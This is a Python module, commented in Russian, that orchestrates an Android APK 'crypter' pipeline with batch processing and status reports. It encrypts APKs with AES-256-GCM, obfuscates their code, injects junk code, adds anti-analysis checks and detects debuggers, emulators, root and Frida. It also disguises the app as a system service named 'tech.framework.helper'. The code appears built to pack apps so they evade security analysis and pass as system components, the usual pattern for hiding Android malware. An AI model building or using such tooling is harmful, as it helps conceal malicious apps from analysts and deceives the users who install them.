import logging
import shutil
from pathlib import Path
from typing import Dict, Optional, Tuple
from datetime import datetime

from services.apk_crypter import APKCrypter
from services.stub_builder import StubBuilder
from services.obfuscator import ObfuscationManager
from services.npmanager import NPManager, TechFrameworkMasker
from services.protection import ProtectionManager, IntegrityChecker
from services.advanced_protection import AndroidEnvironmentDetector, AntiAnalysisProtection

logger = logging.getLogger(__name__)


class FullAPKProtector:
    """
    Полный интегратор для защиты APK на всех уровнях:
    - Обфускация кода
    - Маскировка под системный сервис
    - AES-256-GCM шифрование
    - Проверка целостности
    - Anti-analysis защита
    - Environment detection
    """

    def __init__(self, aggressive: bool = True):
        """
        Инициализирует полный протектор
        
        Args:
            aggressive: Уровень защиты (True = максимальная защита)
        """
        self.aggressive = aggressive
        self.logger = logging.getLogger(__name__)
        
        # Инициализируем все компоненты
        self.apk_crypter = APKCrypter()
        self.stub_builder = StubBuilder()
        self.obfuscator = ObfuscationManager()
        self.npmanager = NPManager(package_name="tech.framework.helper")
        self.tech_masker = TechFrameworkMasker()
        self.protection_manager = ProtectionManager()
        self.integrity_checker = IntegrityChecker()
        self.detector = AndroidEnvironmentDetector()
        self.anti_analysis = AntiAnalysisProtection()
        
        self.temp_dir = Path("temp/full_protection")
        self.output_dir = Path("output")
        self.temp_dir.mkdir(parents=True, exist_ok=True)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        self.logger.info("FullAPKProtector initialized (aggressive=%s)", aggressive)

    def protect_source_code(self, source_code: str) -> str:
        """
        Защищает исходный код всеми техниками
        
        Args:
            source_code: Исходный Python/Java код
        
        Returns:
            Полностью защищенный код
        """
        self.logger.info("Защита исходного кода...")
        
        # Шаг 1: Обфускация кода
        self.logger.info("  1. Обфускация кода...")
        obfuscated = self.obfuscator.code_obfuscator.obfuscate(
            source_code, 
            aggressive=self.aggressive
        )
        
        # Шаг 2: Добавление anti-analysis проверок
        self.logger.info("  2. Добавление anti-analysis проверок...")
        with_analysis_checks = self.anti_analysis.add_anti_analysis_checks(obfuscated)
        
        # Шаг 3: Маскировка под системный сервис
        self.logger.info("  3. Маскировка под tech.framework.helper...")
        masked = self.tech_masker.create_masked_package(
            with_analysis_checks,
            include_service_init=True,
            aggressive=self.aggressive
        )
        
        # Шаг 4: Добавление мусорного кода
        if self.aggressive:
            self.logger.info("  4. Добавление мусорного кода...")
            masked = self.anti_analysis.add_junk_code(masked, junk_count=8)
        
        self.logger.info("Защита исходного кода завершена")
        return masked

    def protect_apk_file(self, apk_path: str, output_name: Optional[str] = None) -> str:
        """
        Полная защита APK файла
        
        Args:
            apk_path: Путь к исходному APK
            output_name: Имя выходного файла (опционально)
        
        Returns:
            Путь к защищенному APK
        """
        self.logger.info("\n" + "="*70)
        self.logger.info("ПОЛНАЯ ЗАЩИТА APK")
        self.logger.info("="*70)
        
        apk_path = Path(apk_path)
        if not apk_path.exists():
            raise FileNotFoundError(f"APK не найден: {apk_path}")
        
        original_size = apk_path.stat().st_size
        self.logger.info(f"Исходный APK: {apk_path}")
        self.logger.info(f"Размер: {original_size} байт")
        
        # Шаг 1: Проверка окружения
        self.logger.info("\n[ШАГ 1] Проверка окружения...")
        env_ok, env_info = self.protection_manager.verify_environment()
        if not env_ok:
            self.logger.warning(f"⚠️  Окружение требует внимания: {env_info}")
        else:
            self.logger.info("✓ Окружение безопасно")
        
        # Шаг 2: Сохранение контрольной суммы оригинального APK
        self.logger.info("\n[ШАГ 2] Сохранение контрольной суммы...")
        self.integrity_checker.store_checksum(apk_path)
        self.logger.info("✓ Контрольная сумма сохранена")
        
        # Шаг 3: Шифрование APK
        self.logger.info("\n[ШАГ 3] Шифрование APK (AES-256-GCM)...")
        encrypted_apk = self.apk_crypter.create_crypted_apk(str(apk_path))
        self.logger.info(f"✓ APK зашифрован: {encrypted_apk}")
        
        encrypted_size = Path(encrypted_apk).stat().st_size
        size_increase = (encrypted_size - original_size) / original_size * 100
        self.logger.info(f"  Размер зашифрованного: {encrypted_size} байт (+{size_increase:.1f}%)")
        
        # Шаг 4: Проверка целостности зашифрованного APK
        self.logger.info("\n[ШАГ 4] Проверка целостности зашифрованного APK...")
        is_valid, message = self.integrity_checker.verify_integrity(Path(encrypted_apk))
        if not is_valid:
            self.logger.warning(f"⚠️ Проблема с целостностью: {message}")
        else:
            self.logger.info("✓ Целостность подтверждена")
        
        # Шаг 5: Генерация отчета защиты
        self.logger.info("\n[ШАГ 5] Генерация отчета безопасности...")
        security_report = self.protection_manager.generate_security_report()
        self.logger.info("✓ Отчет безопасности создан")
        
        # Шаг 6: Android environment detection
        self.logger.info("\n[ШАГ 6] Проверка Android окружения...")
        detection_report = self.detector.get_detection_report()
        if not detection_report['is_safe']:
            self.logger.warning(
                f"⚠️ Обнаружены угрозы: {detection_report['detections_count']}"
            )
        else:
            self.logger.info("✓ Android окружение безопасно")
        
        # Итоговый отчет
        self.logger.info("\n" + "="*70)
        self.logger.info("ИТОГОВЫЙ ОТЧЕТ ЗАЩИТЫ")
        self.logger.info("="*70)
        self.logger.info(f"Оригинальный APK: {original_size} байт")
        self.logger.info(f"Зашифрованный APK: {encrypted_size} байт")
        self.logger.info(f"Увеличение размера: {size_increase:.1f}%")
        self.logger.info(f"Статус безопасности: {security_report['status']}")
        self.logger.info(f"Обнаружено угроз: {detection_report['detections_count']}")
        self.logger.info("="*70 + "\n")
        
        final_output = output_name or f"{apk_path.stem}_protected.apk"
        final_path = self.output_dir / final_output
        shutil.copy(encrypted_apk, final_path)
        
        self.logger.info(f"✓ Защищенный APK: {final_path}")
        
        return str(final_path)

    def protect_apk_batch(self, apk_list: list[str]) -> Dict[str, Dict]:
        """
        Защита нескольких APK в пакетном режиме
        
        Args:
            apk_list: Список путей к APK файлам
        
        Returns:
            Словарь с результатами обработки
        """
        results = {}
        
        self.logger.info(f"\n🔒 Пакетная защита {len(apk_list)} APK файлов")
        
        for i, apk_path in enumerate(apk_list, 1):
            self.logger.info(f"\n[{i}/{len(apk_list)}] Обработка {Path(apk_path).name}...")
            
            try:
                protected_apk = self.protect_apk_file(apk_path)
                results[apk_path] = {
                    "status": "success",
                    "output": protected_apk,
                    "timestamp": datetime.now().isoformat()
                }
            except Exception as e:
                self.logger.error(f"❌ Ошибка: {e}")
                results[apk_path] = {
                    "status": "error",
                    "error": str(e),
                    "timestamp": datetime.now().isoformat()
                }
        
        return results

    def generate_protection_report(self) -> Dict:
        """Генерирует подробный отчет защиты"""
        report = {
            "timestamp": datetime.now().isoformat(),
            "protection_level": "aggressive" if self.aggressive else "light",
            "components": {
                "obfuscation": "Enabled",
                "masking": "tech.framework.helper",
                "encryption": "AES-256-GCM",
                "integrity_checking": "Enabled",
                "anti_analysis": "Enabled",
                "environment_detection": "Enabled"
            },
            "security_features": [
                "Code obfuscation with variable/function renaming",
                "String encoding (hex + runtime decoding)",
                "System package masking (tech.framework.helper)",
                "NPManager control flow obfuscation",
                "Dynamic string decoding",
                "Junk code injection",
                "Anti-tampering monitoring",
                "Rate limiting (brute-force protection)",
                "HMAC-SHA256 security tokens",
                "Android environment detection (Debugger, Emulator, Root, Frida, etc.)",
                "Timing/Memory/Stack analysis detection",
                "Fake system method injection",
                "AES-256-GCM encryption",
                "Key wrapping with salt",
                "File integrity checking"
            ]
        }
        
        return report

    def get_status(self) -> Dict:
        """Получает статус протектора"""
        protection_status = self.protection_manager.get_security_status()
        
        return {
            "protector_active": True,
            "protection_mode": "aggressive" if self.aggressive else "light",
            "components_initialized": {
                "apk_crypter": True,
                "stub_builder": True,
                "obfuscator": True,
                "npmanager": True,
                "tech_masker": True,
                "protection_manager": True,
                "integrity_checker": True,
                "android_detector": True,
                "anti_analysis": True
            },
            "protection_status": protection_status,
            "output_directory": str(self.output_dir),
            "temp_directory": str(self.temp_dir)
        }


class APKProtectionPipeline:
    """
    Конвейер обработки для последовательной защиты APK
    """
    
    def __init__(self):
        self.protector = FullAPKProtector(aggressive=True)
        self.logger = logging.getLogger(__name__)
    
    def process_apk(self, apk_input: str) -> str:
        """
        Полный конвейер защиты APK
        
        Этапы:
        1. Проверка входного APK
        2. Инициализация защиты
        3. Шифрование
        4. Проверка целостности
        5. Генерирование отчета
        
        Args:
            apk_input: Путь к исходному APK
        
        Returns:
            Путь к защищенному APK
        """
        self.logger.info("\n" + "🔐"*35)
        self.logger.info("APK PROTECTION PIPELINE")
        self.logger.info("🔐"*35 + "\n")
        
        return self.protector.protect_apk_file(apk_input)
    
    def process_batch(self, apk_list: list[str]) -> Dict:
        """Обработка пакета APK файлов"""
        return self.protector.protect_apk_batch(apk_list)
    
    def get_report(self) -> Dict:
        """Получает полный отчет защиты"""
        return self.protector.generate_protection_report()
    
    def get_status(self) -> Dict:
        """Получает статус конвейера"""
        return self.protector.get_status()
